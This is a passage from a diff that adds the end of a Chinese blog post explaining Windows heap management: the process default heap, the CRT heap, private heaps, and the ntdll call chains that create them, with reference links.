+大内存：内存管理器分配虚拟内存，内核对应的API包括NtAllocatevirtualMemory、NtProtectvirtualMemory等；
+<img src="/images/pwn0006.png" alt="">
+程序中对堆的直接操作主要有三种：
+1、进程默认堆：每个进程启动的时候系统会创建一个默认堆，LocalAlloc、GlobalAlloc是从进程默认堆上分配内存；也可以使用GetProcessHeap获取进程默认堆的句柄；然后根据用这个句柄去调用HeapAlloc达到在系统默认堆上分配内存的效果；
+2、C++编程中常用的是malloc和new去申请内存，这些由CRT库提供方法。在VS2010之前(包含)，CRT库会使用HeapCreate去创建一个堆，供CRT库自己使用。在VS2015以后CRT库的实现，并不会再去创建一个单独的堆，而使用进程默认堆。
+3、自建堆。这个泛指程序通过HeapCreate去创建的堆，然后利用HeapAlloc等API去操作堆，比如申请空间；
+<img src="/images/pwn0005.png" alt="">
+为了支持C的内存分配函数和C++的内存分配运算符（new和delete，即CRT内存分配函数），编译器的C运行库会创建一个专门的堆供这些函数使用，即CRT堆。</li>
+</ul>
+<p>进程默认堆
+创建进程时操作系统为进程创建的默认堆：ntdll! KiUserApcDispather-&gt; ntdll! LdrpInitialize-&gt; ntdll! LdrplInitializeProcess-&gt; ntdll! RtlCreateHeap
+创建好的堆的句柄保存在PEB结构的ProcessHeap字段中;</p>
+<ul>
+<li>私有堆
+可以通过HeapCreate这个api来创建属于进程的私有堆，这个api实际上会调用RtlCreateHeap函数，创建完毕之后会将创建好的堆句柄保存到peb结构中。
+HeapCreate-&gt; ntdll!RtlCreateHeap-&gt; NtAllocateVirtualMemory
+<a href="https://www.cnblogs.com/XiuzhuKirakira/p/17993207">Windows 堆管理机制 [1] 堆基础</a>
+<a href="https://www.bilibili.com/video/BV13cBXYqE2m?t=103.7&amp;p=32">https://www.bilibili.com/video/BV13cBXYqE2m?t=103.7&p=32</a></li>
+</ul>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+          <div class="post-comments">
+            <div id="disqus_thread"></div>
+<script>
+  window.addEventListener("load", () => {
+    (function() {
+      
+      var d = document,
+        s = d.createElement("script");
+      s.src = "https://joway.disqus.com/embed.js";
+      s.setAttribute("data-timestamp", +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  });
+</script>
+<noscript
+  >Please enable JavaScript to view the
+  <a href="https://disqus.com/?ref_noscript"
+    >comments powered by Disqus.</a
+  ></noscript
+>
+
+          </div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
